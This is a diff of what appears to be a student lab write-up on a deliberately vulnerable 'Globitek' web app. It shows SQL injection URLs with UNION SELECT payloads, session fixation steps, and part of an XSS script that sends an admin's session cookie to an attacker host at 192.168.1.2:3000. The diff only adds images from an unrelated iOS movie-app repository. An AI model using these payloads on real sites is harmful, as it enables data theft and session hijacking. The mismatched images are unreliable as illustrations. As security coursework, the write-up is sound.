@@ -28,6 +28,8 @@ This vulnerability allows remote attackers to cause a denial of service attack v
 - Some of the example commands:
 https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Cdatabase()+--+ https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Ctable_name+FROM+information_schema.tables+where+table_schema%3D%27globitek_blue%27+limit+20+offset+2+--+ https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Ccolumn_name+FROM+information_schema.columns+where+table_schema%3D%27globitek_blue%27+limit+20+offset+2+--+
 
+<img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_11.gif" width=250> <img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_SE(2ndgen)_part_2.gif" width=250><br>
+
 ## Vulnerability #2: Session Hijacking/Fixation
 ### Steps to recreate:
 
@@ -44,6 +46,8 @@ https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%
 - Now the owner on PHPSESSID hardcoded in js script is logged into the website as an admin
 - This is possible because new PHPSESSID is not generated when a used logs into website
 
+<img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_11.gif" width=250> <img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_SE(2ndgen)_part_2.gif" width=250><br>
+
 ## Vulnerability #3: Cross-Site Scripting (XSS)
 ### Steps to recreate:
 
@@ -54,3 +58,5 @@ https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%
   document.getElementById("main-content").appendChild(node);</script>
 - Submit the form
 - When admin checks the feeedback PHPSESSID will be sent to the http://192.168.1.2:3000 address as a GET parameter
+
+<img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_11.gif" width=250> <img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_SE(2ndgen)_part_2.gif" width=250><br>
